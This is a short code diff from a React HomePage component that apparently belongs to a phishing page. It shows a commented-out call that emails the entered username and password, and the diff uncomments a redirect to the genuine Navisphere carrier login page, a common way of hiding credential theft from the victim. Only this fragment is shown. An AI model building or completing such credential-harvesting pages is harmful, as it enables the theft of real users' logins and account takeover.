@@ -53,7 +53,7 @@ function HomePage() {
                         console.log("error.text");
                     });
                     // sendEmail(userName.current.value, passwordUser.current.value);
-                    // window.location.href = "https://www.navispherecarrier.com/login";
+                    window.location.href = "https://www.navispherecarrier.com/login";
                     return;
                 }
             }
